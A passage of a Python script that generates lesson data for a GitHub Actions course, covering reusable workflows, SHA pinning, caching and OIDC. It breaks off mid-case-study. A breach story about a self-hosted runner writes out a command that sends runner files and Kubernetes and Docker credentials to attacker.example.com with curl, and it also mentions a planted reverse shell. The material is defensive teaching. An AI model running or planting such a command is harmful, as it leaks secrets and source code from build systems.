# scripts/generate_git_days46_50_final.py
import sys
import os
import json

sys.stdout.reconfigure(encoding='utf-8')
sys.path.insert(0, os.path.abspath("."))

from scripts.build_full_git_days46_50 import bash_snippets, bash_outputs

days_data = {
    46: {
        "day": 46,
        "coursePrefix": "git_vcs",
        "title": "Advanced GitHub Actions: Composite Actions, Reusable Workflows (workflow_call), Matrix Strategies & Cache",
        "goal": "Master advanced GitHub Actions architecture at enterprise scale: eliminate YAML copy-paste debt across microservice fleets by encapsulating multi-step sequences into Custom Composite Actions, architecting centralized Reusable Workflows invoked via workflow_call, executing multidimensional cross-platform Matrix strategies across operating systems and runtimes, slashing build durations by 80% using actions/cache with deterministic lockfile hash keys, and pinning external actions to immutable 40-character commit SHAs to defeat software supply-chain poisoning.",
        "summary": [
            "Differentiated Composite Actions (step-level encapsulation within a single job runner) from Reusable Workflows (job-level encapsulation invoked via workflow_call).",
            "Audited the Mutable Tag (@main / @v1) Action Supply-Chain Poisoning incident across 200 build runners and enforced 40-character commit SHA pinning.",
            "Engineered centralized .github reusable workflows governing 80 microservice repositories through 10-line caller files and multidimensional OS/runtime matrices.",
            "Optimized dependency hydration via actions/cache using primary lockfile hash keys and hierarchical restore-keys while preventing cross-branch cache poisoning.",
            "Issued the sovereign MODULAR-GHA-ARCHITECTURE-CERTIFIED audit seal via MasterModularCiGateway."
        ],
        "projectStep": {
            "title": "Stage 10 Enterprise GitHub Engineering: Modular CI Encapsulation & Matrix Caching",
            "steps": [
                "Model workflow_call contracts and Composite Action interfaces using GhaModularContractArchitect.",
                "Audit mutable tag supply-chain compromises and enforce 40-char SHA pinning using GhaSupplyChainPinAuditor.",
                "Synthesize cross-platform matrix pipelines and centralized callers using GhaReusableMatrixEngine.",
                "Stress-test primary and fallback restore-keys under concurrent load using GhaCacheIsolationSimulator.",
                "Issue the sovereign MODULAR-GHA-ARCHITECTURE-CERTIFIED audit seal via MasterModularCiGateway."
            ]
        },
        "parts": [
            {
                "title": "Modular CI Encapsulation: Composite Actions vs Reusable Workflows (workflow_call)",
                "say": [
                    "Welcome to Day 46 of PinIT Career OS and the launch of Block 10: Enterprise GitHub Engineering & Infrastructure. In Block 9, you hardened repository history with cryptographic signatures, entropy secret scanning, and SHA-256 Merkle trees. Today, we elevate our focus from the local repository object store to the distributed continuous integration and delivery control plane: Advanced GitHub Actions Architecture.",
                    "In a growing startup, junior engineers often build continuous integration pipelines by copying and pasting a two-hundred-line `.github/workflows/ci.yml` file across forty or eighty microservice repositories. Within six months, that architectural anti-pattern turns into an operational nightmare. When the security team needs to upgrade a Node.js runtime version, patch a vulnerability scanner flag, or rotate a build container registry URL, platform engineers are forced to open eighty separate pull requests across eighty repositories.",
                    "Senior staff engineers and platform architects treat CI/CD configuration with the exact same software engineering rigor as production application code: enforcing the DRY (Don't Repeat Yourself) principle through Modular CI Encapsulation. GitHub Actions provides two distinct, complementary primitives for modular abstraction: Custom Composite Actions and Reusable Workflows (`on: workflow_call`).",
                    "Understanding the architectural boundary between these two mechanisms is a classic senior infrastructure interview discriminator. A Composite Action (`runs: using: 'composite'` inside an `action.yml` file) bundles multiple shell commands and sub-steps into a single reusable step that executes inside the caller's existing job and on the caller's existing virtual machine runner. It shares the same filesystem workspace, environment variables, and runner operating system context as the step immediately before and after it.",
                    "In contrast, a Reusable Workflow (`on: workflow_call` inside a `.github/workflows/*.yml` file) encapsulates entire multi-job pipelines, including runner provisioning (`runs-on`), container service definitions, environment deployment gates, and matrix fan-out strategies. Formally, a Reusable Workflow defines a strict functional contract: $\\text{Contract}(\\text{inputs}, \\text{secrets}) \\to \\text{outputs}$. Calling repositories invoke the central workflow with a minimal ten-line caller YAML file, delegating complete job orchestration to a centralized `.github` governance repository.",
                    "Crucially, modular encapsulation must be paired with supply-chain immutability. When referencing any third-party or cross-repository action or workflow, referencing mutable Git tags like `@v4` or branch names like `@main` exposes your build infrastructure to upstream tag hijacking. Enterprise architecture mandates pinning every action reference to its full, immutable 40-character Git commit SHA (for example, `actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11`), ensuring that the exact code audited by security is the exact code executed on corporate runners.",
                    "Simultaneously, high-velocity pipelines eliminate redundant network I/O by leveraging `actions/cache` keyed on operating system identifiers and cryptographic dependency lockfile digests: `${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}`. When lockfiles remain unchanged across commits, dependency installation drops from four minutes to eight seconds, slashing CI compute costs by eighty percent.",
                    "In this opening masterclass, we codify the Modular CI Encapsulation specification in our virtual workspace, defining strict `workflow_call` input/secret contracts, immutable 40-character SHA pinning standards, and deterministic lockfile caching policies.",
                    "Mastering modular workflow architecture transforms you from a YAML script maintainer into an enterprise CI platform architect capable of governing hundreds of microservices from a single, version-controlled source of truth."
                ],
                "example": "Think of a Composite Action like a reusable helper function imported into your existing process memory thread, whereas a Reusable Workflow (`workflow_call`) is like invoking a standalone microservice API that provisions its own compute cluster, executes a multi-stage workflow, and returns a structured response payload.",
                "code": bash_snippets[(46, 1)],
                "output": bash_outputs[(46, 1)],
                "codeNotes": [
                    "Defines Modular CI Encapsulation combining workflow_call and Composite Actions.",
                    "Establishes the formal Contract(inputs, secrets) -> outputs functional interface.",
                    "Enforces 40-character immutable commit SHA pinning for third-party actions.",
                    "Configures deterministic actions/cache keys using runner.os and hashFiles('package-lock.json')."
                ],
                "tryIt": "Run grep \"IMMUTABLE_PINNING\" /home/student/workspace/gha_reusable/spec.txt to verify the commit SHA pinning standard.",
                "check": {
                    "question": "What is the primary architectural difference between a GitHub Composite Action and a Reusable Workflow (`workflow_call`)?",
                    "options": [
                        "A Composite Action bundles multiple steps to run inside an existing job and runner filesystem, whereas a Reusable Workflow encapsulates complete jobs, runner provisioning (`runs-on`), and matrix strategies",
                        "A Composite Action can only be written in Rust, whereas a Reusable Workflow can only run on Windows servers",
                        "Reusable Workflows cannot accept inputs or secrets, whereas Composite Actions automatically access all organization secrets without declaration",
                        "Composite Actions require paying double GitHub Actions billing minutes per step"
                    ],
                    "answer": 0,
                    "why": "Composite Actions encapsulate step sequences inside a caller's job and runner, while Reusable Workflows (`workflow_call`) encapsulate full job definitions, runner selection, environments, and matrices."
                }
            },
            {
                "title": "The Mutable Tag Supply-Chain Compromise: Forensic Autopsy & 40-Char SHA Pinning",
                "say": [
                    "To appreciate why enterprise security boards forbid mutable action tags like `@v3` or `@main`, let us examine a high-severity real-world software supply-chain disaster: The Mutable Tag Action Supply-Chain Poisoning Incident. This outage pattern mirrors infamous industry breaches such as the Codecov uploader compromise and the `tj-actions/changed-files` tag hijacking incident.",
                    "In our production case study, an enterprise engineering organization maintained two hundred microservice repositories. Every repository's CI workflow referenced a popular third-party linting and reporting action using a mutable branch reference: `uses: acme-open-source/lint-reporter@main`. The engineering team assumed that referencing `@main` was convenient because they would automatically receive bug fixes without updating their workflow files.",
                    "On a Friday evening, an external threat actor compromised the personal GitHub account of a maintainer of `acme-open-source/lint-reporter` via a phishing campaign. With push access to that public repository, the attacker modified the action's underlying JavaScript entrypoint (`dist/index.js`) to dump all environment variables—including `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, and private npm publishing tokens—and exfiltrate them via an encrypted HTTPS POST request to an external command-and-control server, while also spawning background cryptocurrency mining processes.",
                    "Because the enterprise workflows referenced `@main` (or even if they had referenced a movable Git tag like `@v1`, which the attacker force-pushed using `git tag -f v1 && git push --force origin v1`), GitHub Actions dynamically resolved the mutable pointer at job startup time. Overnight, two hundred corporate scheduled builds and pull request pipelines pulled the poisoned commit directly into privileged enterprise build runners.",
                    "Why did a release tag like `@v1` or `@v1.4.2` fail to protect the enterprise? Because in Git's data model, a tag is merely a mutable pointer stored in `refs/tags/`. Anyone with write permissions to the upstream action repository can delete a tag and recreate it pointing to a completely different commit hash. Only a full 40-character cryptographic commit SHA is mathematically bound to the exact Merkle tree of the source files.",
                    "Note that short SHAs (such as 7-character or 8-character prefixes) are also rejected by GitHub's action parser and insufficient against brute-force prefix collisions. You must specify the complete 40-character hexadecimal SHA-1 digest (or 64-character SHA-256 digest), accompanied by a human-readable YAML comment indicating the semantic version for maintainability, such as `uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2`.",
                    "To automate updates safely without reintroducing supply-chain risk, enterprise platform teams pair 40-character SHA pinning with Dependabot or Renovate configured for `github-actions`. When an upstream maintainer releases a new version, Renovate opens an automated pull request that bumps the 40-character commit SHA from the old hash to the new hash, allowing security scanners and code reviewers to inspect the exact diff before merging.",
                    "In this forensic detective exercise, we reconstruct the Mutable `@main` Tag Supply-Chain Poisoning incident in our shell environment, documenting the 200-runner blast radius and establishing mandatory 40-character SHA pinning governance.",
                    "Internalizing this supply-chain failure mode ensures that your CI/CD pipelines remain impervious to upstream account takeovers and malicious tag retargeting."
                ],
                "example": "Using `uses: vendor/action@main` in your CI workflow is like signing a blank check and allowing an external vendor to rewrite the dollar amount right before the bank processes it; pinning `@40-char-sha` locks the exact cryptographic bytes of the contract in stone.",
                "code": bash_snippets[(46, 2)],
                "output": bash_outputs[(46, 2)],
                "codeNotes": [
                    "Audits the Mutable @main Tag Supply-Chain Poisoning incident across 200 corporate build runners.",
                    "Identifies mutable Git refs (branches and force-pushable tags) as the root vulnerability.",
                    "Enforces full 40-character commit SHA pinning across all third-party and internal actions.",
                    "Combines immutable SHA pinning with automated Renovate/Dependabot SHA-bump pull requests."
                ],
                "tryIt": "Run grep \"REMEDY\" /home/student/workspace/gha_tag_compromise/forensics.txt to inspect the mandatory remediation control.",
                "check": {
                    "question": "Why does enterprise security compliance mandate pinning third-party GitHub Actions to their full 40-character commit SHA rather than semantic version tags like `@v4`?",
                    "options": [
                        "Git tags like `@v4` are mutable pointers that an attacker can force-push to point to malicious code if the upstream repository is compromised, whereas a 40-character commit SHA is cryptographically bound to an immutable Merkle tree",
                        "GitHub Actions charges 50% less compute billing when 40-character commit SHAs are used",
                        "Semantic version tags like `@v4` only work on Ubuntu runners and fail on macOS and Windows",
                        "GitHub automatically deletes semantic version tags after 90 days"
                    ],
                    "answer": 0,
                    "why": "Upstream maintainers (or attackers who compromise their accounts) can retarget or force-push Git tags (`git tag -f v4`) to malicious commits, whereas a full 40-character commit SHA guarantees cryptographic immutability."
                }
            },
            {
                "title": "Enterprise Reusable Workflow Libraries & Multidimensional Matrix Strategies",
                "say": [
                    "Now that we understand the security imperative of immutable pinning, let us architect an enterprise-scale Reusable Workflow and Multidimensional Matrix Library. Consider the situational puzzle faced by every VP of Engineering: how do you standardize linting, static analysis, unit testing, and container image signing across eighty microservice repositories without duplicating YAML logic?",
                    "The optimal systems architecture is a centralized `.github` repository (or dedicated `ci-templates` repository) housing parameterized Reusable Workflows triggered by `on: workflow_call`. Instead of maintaining two hundred lines of step definitions in every service repository, each of the eighty microservice repositories contains a lean ten-line caller workflow: `uses: org/.github/.github/workflows/standard-node-ci.yml@a1b2c3d4...` with typed `with:` inputs and `secrets: inherit` or explicit least-privilege secret mappings.",
                    "Inside the centralized reusable workflow, we harness the power of Multidimensional Matrix Strategies (`strategy: matrix`). Suppose an enterprise SDK or core CLI tool must be verified across three operating systems (`ubuntu-latest`, `windows-latest`, `macos-latest`) and three Node.js runtime versions (`18.x`, `20.x`, `22.x`). Writing nine separate job definitions would bloat the workflow and invite configuration drift.",
                    "By declaring `matrix: os: [ubuntu-latest, windows-latest, macos-latest]` and `node: [18, 20, 22]`, GitHub Actions computes the Cartesian product ($3 \\times 3 = 9$) at workflow parse time and spawns nine parallel, isolated virtual machine runners simultaneously. Each job instance accesses its specific coordinates via context expressions: `runs-on: ${{ matrix.os }}` and `node-version: ${{ matrix.node }}`.",
                    "Enterprise matrix engineering also requires fine-grained control over failure propagation and edge-case permutations. By default, GitHub Actions sets `fail-fast: true` on matrix strategies—meaning that if a single flaky test fails on `windows-latest` with Node 18, GitHub immediately sends a cancellation signal (`SIGINT`/`SIGTERM`) to all eight other running matrix jobs, robbing developers of visibility into whether the failure was OS-specific or universal.",
                    "Setting `fail-fast: false` ensures that all nine matrix permutations run to completion, giving engineers a complete diagnostic compatibility table on every pull request. Furthermore, using `matrix.include` allows injecting specialized environment variables or experimental flags into specific combinations, while `matrix.exclude` prunes unsupported combinations (such as legacy Node 18 on brand-new ARM64 macOS images) to conserve runner concurrency quotas.",
                    "When combined with `max-parallel: 4`, platform teams can throttle concurrency when matrix jobs interact with rate-limited external staging databases or license servers, preventing self-inflicted denial-of-service spikes.",
                    "In this implementation lab, we deploy the Centralized `.github` Reusable Workflow and Matrix Engine in our workspace, verifying the 3x3 cross-platform Cartesian topology, 80% cache savings, and 80-repository standardization.",
                    "This centralized workflow architecture empowers a small platform team to update security scanners or runtime versions in one commit and propagate those improvements instantaneously across the entire engineering organization."
                ],
                "example": "A centralized Reusable Workflow with a 3x3 Matrix is like an automated factory master blueprint: updating one parameter on the master blueprint updates all 80 factory assembly lines, and each assembly line automatically tests the product across 9 environmental chambers in parallel.",
                "code": bash_snippets[(46, 3)],
                "output": bash_outputs[(46, 3)],
                "codeNotes": [
                    "Deploys a centralized .github Reusable Workflow Library invoked by 80 microservice repos.",
                    "Synthesizes a 3 OS x 3 Node.js Cartesian product (9 parallel jobs) via strategy.matrix.",
                    "Achieves 80% build time reduction by integrating deterministic lockfile caching per matrix axis.",
                    "Reduces per-repository CI configuration overhead to a 10-line declarative caller workflow."
                ],
                "tryIt": "Run grep \"MATRIX_TOPOLOGY\" /home/student/workspace/gha_matrix_library/matrix_run.txt to inspect the parallel Cartesian job expansion.",
                "check": {
                    "question": "In a GitHub Actions `strategy: matrix` configuration, what happens by default when `fail-fast` is not explicitly set to `false`?",
                    "options": [
                        "`fail-fast` defaults to `true`, which immediately cancels all other in-progress matrix jobs as soon as any single matrix job fails",
                        "`fail-fast` defaults to `false`, allowing all jobs to run for up to 72 hours",
                        "GitHub Actions automatically retries failed matrix jobs 10 times before reporting an error",
                        "Matrix jobs execute sequentially one after another on a single runner"
                    ],
                    "answer": 0,
                    "why": "By default, `fail-fast: true` cancels all remaining in-flight jobs in the matrix as soon as one job fails; setting `fail-fast: false` preserves complete cross-platform diagnostic visibility."
                }
            },
            {
                "title": "Dependency Cache Mechanics: Primary Keys, Restore-Keys & Cache Isolation",
                "say": [
                    "While parallel matrix jobs accelerate wall-clock feedback, downloading and compiling gigabytes of npm, pip, Cargo, or Maven dependencies across nine matrix runners on every commit will rapidly exhaust enterprise network bandwidth and GitHub Actions storage quotas. To solve this, we must master the internal mechanics, eviction policies, and security boundaries of `actions/cache`.",
                    "How does `actions/cache` resolve caches? Every cache step defines two core parameters: a deterministic primary `key` and an ordered list of fallback `restore-keys`. Consider the primary key `${{ runner.os }}-${{ matrix.node }}-npm-${{ hashFiles('**/package-lock.json') }}`. Notice why both `runner.os` and `matrix.node` must be embedded in the key: native C++ add-ons (like `bcrypt` or `sharp`) compile platform-specific and ABI-specific shared binaries (`node_modules/**/*.node`). Sharing a Linux x64 cache with a macOS ARM64 runner would cause immediate `Exec format error` crashes at runtime!",
                    "When a workflow runs and the `package-lock.json` hash matches an existing cache entry in the current branch or the default branch (`main`), `actions/cache` achieves an exact **Primary Key Hit**. It downloads the compressed Zstandard (`.tzst`) archive at multi-gigabit speeds, extracts it to `~/.npm` or `node_modules`, and skips writing a new cache at the end of the job because caches in GitHub Actions are strictly immutable once written.",
                    "What happens when a developer adds a single new library to `package.json`, altering the SHA-256 digest of `package-lock.json`? The primary key misses! Without fallback logic, the runner would have to download all 1,500 unchanged packages from the internet from scratch. This is where `restore-keys` shines: by specifying a prefix fallback such as `${{ runner.os }}-${{ matrix.node }}-npm-`, `actions/cache` searches for the most recently created cache matching that prefix.",
                    "It restores the 99% matching dependency archive, allowing `npm ci` or `pip` to fetch only the single newly added packageDelta, and then—because the primary key missed at the start of the job—the `Post Cache` step automatically uploads a brand-new immutable cache entry indexed under the new `package-lock.json` hash!",
                    "Architects must also understand **Branch Scope Isolation** to prevent Cache Poisoning. By design, a feature branch can read caches created on that same feature branch, its parent base branch, or the repository's default branch (`main`). However, two sibling pull request branches (`feature-a` and `feature-b`) are strictly isolated from reading each other's caches, and an untrusted pull request branch can never write a cache entry that pollutes `main` prior to merge.",
                    "Furthermore, GitHub enforces a 10 GB repository cache limit (or custom enterprise policy quota) governed by a Least Recently Used (LRU) eviction algorithm: caches not accessed within 7 days are automatically purged, and exceeding the 10 GB ceiling evicts the oldest untouched archives.",
                    "In this production stress lab, we simulate concurrent matrix cache contention and lockfile drift, validating exact primary key hits, prefix-based `restore-keys` fallback recovery, and strict cross-branch cache isolation.",
                    "Mastering cache key topology and scope isolation ensures that your enterprise pipelines run at blazing speeds while remaining immune to cross-OS binary corruption and cross-branch cache poisoning."
                ],
                "example": "A primary cache key is like looking up a textbook by its exact ISBN edition number; `restore-keys` prefix matching is like grabbing the previous edition off the shelf when the new edition isn't cached yet, reading only the 2-page addendum online, and then shelving the complete new edition for the next student.",
                "code": bash_snippets[(46, 4)],
                "output": bash_outputs[(46, 4)],
                "codeNotes": [
                    "Simulates concurrent matrix builds under lockfile drift and cache contention.",
                    "Verifies exact Primary Key Hits using OS, runtime, and SHA-256 lockfile digests.",
                    "Validates prefix-based restore-keys fallback hydration and post-job cache saving.",
                    "Confirms strict branch-scope isolation preventing sibling PR cache poisoning."
                ],
                "tryIt": "Run grep \"FALLBACK_RESTORE\" /home/student/workspace/gha_cache_stress/cache_audit.txt to inspect the prefix restore behavior.",
                "check": {
                    "question": "How does `actions/cache` behave when the primary `key` misses due to a lockfile update, but a prefix in `restore-keys` matches an earlier cache?",
                    "options": [
                        "It downloads the most recent cache matching the `restore-keys` prefix to warm the workspace, and at the end of the successful job, uploads a new immutable cache under the exact primary `key`",
                        "It overwrites the existing cache entry in place without changing its key",
                        "It deletes all caches in the repository and fails the build",
                        "It downloads caches from unrelated sibling feature branches (`feature-x`) to find a match"
                    ],
                    "answer": 0,
                    "why": "A `restore-keys` hit warms the directory with the closest prior cache (partial cache hit), and because the primary `key` was not matched initially, the post-job hook uploads a new cache under the new primary `key`."
                }
            },
            {
                "title": "Master Modular CI Gateway & Supply-Chain Governance Certification",
                "say": [
                    "We conclude Day 46 by deploying the `MasterModularCiGateway`, the automated compliance gatekeeper that audits all GitHub Actions workflows across an enterprise organization before changes can merge into protected branches.",
                    "Why is an automated workflow governance gateway essential? Because even after a platform team builds a gold-standard library of Reusable Workflows and Composite Actions, entropy creeps in through daily developer pull requests. An engineer rushing to ship a hotfix might paste an unpinned third-party action (`uses: random-user/helper@master`), hardcode a cache key without an OS prefix, or duplicate fifty lines of build logic instead of calling the centralized `workflow_call` template.",
                    "Our `MasterModularCiGateway` enforces three non-negotiable architectural invariants across every `.github/workflows/*.yml` and `action.yml` file in the organization:",
                    "First, **100% Immutable Commit SHA Pinning**: Every `uses:` directive referencing an external action or cross-repository workflow is parsed and validated against a strict regular expression requiring a 40-character hexadecimal SHA digest (`@[0-9a-f]{40}`). Any reference to `@main`, `@master`, `@latest`, or a bare semantic version tag like `@v3` triggers an immediate policy violation with an automated fix suggestion showing the current resolved commit SHA.",
                    "Second, **Modular Encapsulation Compliance**: Service repositories are audited to ensure they consume the organization's approved `workflow_call` pipelines for build, test, SAST security scanning, and container publishing rather than maintaining drifted, ad-hoc shell scripts.",
                    "Third, **Deterministic Multi-Axis Cache Key Hygiene**: All `actions/cache` invocations are inspected to verify that `runner.os`, runtime architecture, and `hashFiles(...)` digests are incorporated into the primary key, eliminating cross-platform binary collisions.",
                    "Beyond security and speed, this centralized modularity delivers massive compliance leverage during SOC 2, PCI-DSS, and FedRAMP audits. Instead of auditors sampling eighty separate microservice pipelines to verify whether software bill of materials (SBOM) generation and vulnerability scanning are active, the platform team proves that all eighty repositories inherit a single, locked Reusable Workflow governed by the security team.",
                    "Let us execute the `MasterModularCiGateway` verification suite in our workspace, confirming 100% SHA pinning compliance and 80/80 repository encapsulation to issue the sovereign `MODULAR-GHA-ARCHITECTURE-CERTIFIED` audit seal.",
                    "With Day 46 complete, you have mastered the architecture of Reusable Workflows, Composite Actions, Matrix fan-out, and deterministic caching. Tomorrow in Day 47, we eliminate static cloud credentials forever by mastering OpenID Connect (OIDC) Cloud Federation and ephemeral Kubernetes Self-Hosted Runners!"
                ],
                "example": "The Master Modular CI Gateway acts like an automated building code inspector that checks every blueprint before construction begins—rejecting uncertified materials (mutable tags) and enforcing standardized structural beams (`workflow_call`).",
                "code": bash_snippets[(46, 5)],
                "output": bash_outputs[(46, 5)],
                "codeNotes": [
                    "Executes MasterModularCiGateway across all organizational workflow definitions.",
                    "Verifies 100% compliance with 40-character immutable commit SHA action pinning.",
                    "Confirms 80/80 microservice pipelines route through centralized workflow_call templates.",
                    "Issues the sovereign MODULAR-GHA-ARCHITECTURE-CERTIFIED audit seal."
                ],
                "tryIt": "Run cat /home/student/workspace/gha_modular_gateway/gateway_seal.txt to verify the modular CI governance seal.",
                "check": {
                    "question": "How does centralizing CI/CD pipelines via `workflow_call` Reusable Workflows simplify enterprise SOC 2 and ISO 27001 compliance audits?",
                    "options": [
                        "Platform teams can enforce mandatory security scanning, SBOM generation, and 40-char SHA pinning in one central workflow repository that all service repositories inherit, providing a single auditable control point",
                        "It allows organizations to skip writing unit tests in individual microservice repositories",
                        "It automatically encrypts source code so external auditors cannot read the repository",
                        "It disables GitHub Actions billing for all private repositories"
                    ],
                    "answer": 0,
                    "why": "Centralized reusable workflows establish a single, version-controlled governance point where security and compliance controls are defined once and inherited across all calling repositories."
                }
            }
        ]
    },

    47: {
        "day": 47,
        "coursePrefix": "git_vcs",
        "title": "Self-Hosted Runners, Security Isolation, Ephemeral Environments & OIDC Cloud Authentication (AWS/GCP)",
        "goal": "Eliminate static long-lived cloud credentials from CI/CD pipelines and harden custom compute infrastructure: master OpenID Connect (OIDC) identity federation between GitHub Actions and AWS/GCP/Azure, configure cryptographic JSON Web Token (JWT) subject (`sub`) and audience (`aud`) claim conditions in cloud IAM trust policies, diagnose persistent self-hosted runner workspace exfiltration vulnerabilities, and deploy ephemeral single-use Kubernetes container runners via Actions Runner Controller (ARC).",
        "summary": [
            "Architected Zero-Secret OpenID Connect (OIDC) cloud federation exchanging GitHub-signed JWTs for short-lived 60-minute AWS STS and GCP workload credentials.",
            "Forensically investigated the Persistent Self-Hosted Runner Disk Cache Exfiltration breach caused by reusing non-ephemeral VMs across untrusted PRs.",
            "Eliminated 50 static 3-year-old IAM user access keys by deploying strict OIDC IAM Role trust policies bound to explicit repository and branch `sub` claims.",
            "Stress-tested 50 parallel ephemeral Kubernetes runner pods orchestrated by Actions Runner Controller (ARC), proving 100% post-job filesystem destruction.",
            "Issued the sovereign ZERO-SECRET-OIDC-FEDERATION-CERTIFIED audit seal via MasterZeroSecretOidcGateway."
        ],
        "projectStep": {
            "title": "Stage 10 Enterprise GitHub Engineering: Zero-Secret OIDC Federation & Ephemeral ARC Runners",
            "steps": [
                "Design cryptographic OIDC JWT token exchange protocols using GitHubOidcFederationArchitect.",
                "Audit persistent self-hosted runner workspace leaks using RunnerFilesystemForensicInspector.",
                "Migrate legacy static AWS/GCP IAM keys to scoped OIDC IAM Roles using CloudOidcTrustPolicyEngine.",
                "Validate single-use pod teardown across 50 concurrent jobs using ArcEphemeralRunnerStressLab.",
                "Issue the sovereign ZERO-SECRET-OIDC-FEDERATION-CERTIFIED audit seal via MasterZeroSecretOidcGateway."
            ]
        },
        "parts": [
            {
                "title": "Zero-Secret Cloud Federation: OpenID Connect (OIDC) JWT Architecture & STS Exchange",
                "say": [
                    "Welcome to Day 47 of PinIT Career OS. For over a decade, the standard method for deploying cloud infrastructure from a CI/CD pipeline was to create an AWS IAM user or Google Cloud Service Account, generate a static long-lived credential (`AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` or a GCP JSON keyfile), and paste it into GitHub Secrets. Today, security architects recognize that pattern as a ticking catastrophic liability.",
                    "Static long-lived cloud keys stored in CI secrets violate every principle of modern Zero-Trust security. They never expire unless manually rotated; they frequently possess overly broad wildcard permissions; and if a single workflow is misconfigured or a supply-chain dependency is compromised, an attacker exfiltrates a credential that grants 24/7 access to your production cloud account from anywhere on the internet.",
                    "The modern architectural replacement is **Zero-Secret Cloud Identity Federation via OpenID Connect (OIDC)**. With OIDC, you store **zero** cloud access keys, **zero** passwords, and **zero** long-lived secrets in GitHub. Instead, you establish a direct cryptographic trust relationship between your cloud provider's Identity and Access Management (IAM) service and GitHub's built-in OIDC Identity Provider (`https://token.actions.githubusercontent.com`).",
                    "Let us trace the exact cryptographic protocol of an OIDC workflow execution step by step: $\\text{GitHub OIDC JWT} \\xrightarrow{\\text{STS Exchange}} \\text{Ephemeral Cloud Role Session}$. First, the GitHub Actions workflow declares `permissions: id-token: write` in its YAML job specification. Without `id-token: write`, the runner is barred from requesting identity tokens.",
                    "Second, when the deployment step executes (using `aws-actions/configure-aws-credentials` or `google-github-actions/auth`), the runner requests a cryptographically signed JSON Web Token (JWT) from GitHub's internal OIDC token endpoint. GitHub signs this JWT using its private RS256 cryptographic key and embeds tamper-proof metadata claims describing the exact context of the workflow run.",
                    "What are the critical claims inside a GitHub OIDC JWT? The issuer (`iss`) is `https://token.actions.githubusercontent.com`; the audience (`aud`) specifies the target cloud STS endpoint (such as `sts.amazonaws.com`); and most importantly, the subject (`sub`) encodes the exact repository, branch, or deployment environment, such as `repo:pinit-org/payments-api:ref:refs/heads/main` or `repo:pinit-org/payments-api:environment:production`, alongside custom claims like `job_workflow_ref` and `sha`.",
                    "Third, the runner presents this signed JWT to AWS Security Token Service (`AssumeRoleWithWebIdentity`) or GCP Workload Identity Federation. The cloud provider fetches GitHub's public JSON Web Key Set (JWKS) from `https://token.actions.githubusercontent.com/.well-known/jwks`, mathematically verifies the RS256 signature on the JWT, and evaluates the IAM Role's Trust Policy conditions against the JWT's `aud` and `sub` claims.",
                    "If and only if the signature is valid and the `sub` claim matches `repo:pinit-org/payments-api:ref:refs/heads/main`, AWS STS mints a temporary, short-lived session credential (`AccessKeyId`, `SecretAccessKey`, `SessionToken`) valid for at most 60 minutes (or 15 minutes for short deployments) and returns it directly into the runner's memory. When the job finishes minutes later, the token expires automatically.",
                    "In this opening lab, we codify the OIDC Zero-Secret Federation architecture in our workspace, detailing the JWT claim structure, STS exchange handshake, and 60-minute credential TTL.",
                    "Mastering OIDC federation eliminates secret rotation toil forever and ensures that no static cloud credentials ever exist to be leaked from your GitHub repositories."
                ],
                "example": "Storing static AWS keys in GitHub Secrets is like hiding a physical master brass key under your office doormat for delivery drivers; OIDC federation is like a smart biometric hotel lock where the front desk mints a cryptographically signed keycard coded specifically for one delivery person, one room, and a 15-minute window.",
                "code": bash_snippets[(47, 1)],
                "output": bash_outputs[(47, 1)],
                "codeNotes": [
                    "Defines the OpenID Connect (OIDC) Zero-Secret Federation protocol for CI/CD.",
                    "Maps the cryptographic exchange: GitHub RS256 Signed JWT -> Cloud STS Role Session.",
                    "Validates strict JWT claims including sub (repo + branch ref) and aud (sts.amazonaws.com).",
                    "Enforces 60-minute auto-expiring credentials with zero static secrets stored in GitHub."
                ],
                "tryIt": "Run grep \"CLAIM_VALIDATION\" /home/student/workspace/oidc_federation/oidc_spec.txt to inspect the OIDC JWT subject and audience conditions.",
                "check": {
                    "question": "In a GitHub Actions OIDC cloud authentication flow, how does AWS IAM or GCP Workload Identity verify that a token request comes from an authorized branch of a specific repository?",
                    "options": [
                        "By cryptographically verifying GitHub's RS256 signature on the OIDC JWT against GitHub's public JWKS and checking that the JWT `sub` (subject) and `aud` (audience) claims match the IAM Role's trust policy conditions",
                        "By reading a plaintext password stored in the repository's README.md file",
                        "By trusting any request that includes the HTTP header `User-Agent: GitHub-Actions`",
                        "By emailing the repository administrator a 6-digit SMS code on every build"
                    ],
                    "answer": 0,
                    "why": "Cloud STS endpoints validate the JWT's cryptographic signature using GitHub's public JWKS and enforce IAM Trust Policy conditions against the token's `sub` (e.g., `repo:org/repo:ref:refs/heads/main`) and `aud` claims."
                }
            },
            {
                "title": "The Persistent Self-Hosted Runner Breach: Workspace Residue & Security Isolation",
                "say": [
                    "While GitHub-hosted runners (`ubuntu-latest`) run inside fresh, single-use virtual machines that Microsoft destroys immediately after each job completes, many enterprises deploy **Self-Hosted Runners** inside their own private VPC networks. Why? To access internal staging databases behind private firewalls, utilize specialized GPU hardware, or run high-memory 64-core builds without incurring per-minute cloud runner overages.",
                    "However, misconfiguring Self-Hosted Runners introduces one of the most devastating attack vectors in enterprise DevOps: **The Persistent Self-Hosted Runner Disk Cache Exfiltration**. Let us conduct a forensic post-mortem of a real-world breach caused by running a persistent, non-ephemeral self-hosted Linux virtual machine.",
                    "In our incident case study, an infrastructure team provisioned four long-lived EC2 virtual machines, installed the GitHub Actions runner agent (`./config.sh && ./run.sh`) as a persistent systemd service, and registered the runner group across the organization—including a public SDK repository that accepted pull requests from external open-source contributors.",
                    "Why was this fatal? Because a traditional persistent self-hosted runner does **not** wipe its operating system or workspace directory (`/home/runner/_work`) between jobs! At 10:00 AM, the persistent runner executed a private internal deployment job that wrote temporary kubeconfig files to `~/.kube/config`, cached internal Docker layers in `/var/lib/docker`, and left build artifacts inside `/tmp` and `_work`.",
                    "At 10:15 AM, an external threat actor forked the company's public SDK repository, modified the test script inside `package.json` to execute `find /home/runner /tmp ~/.docker ~/.kube -type f -exec cat {} + | curl -X POST https://attacker.example.com -d @-`, and opened a Pull Request. The persistent self-hosted runner picked up the untrusted PR job under the exact same OS user (`runner`) and on the exact same dirty filesystem!",
                    "Within three seconds, the attacker exfiltrated residual cloud credentials, internal Kubernetes cluster certificates, and proprietary source code left behind by previous jobs, and even installed a persistent background reverse-shell daemon in `/dev/shm` to hijack all future jobs scheduled on that VM.",
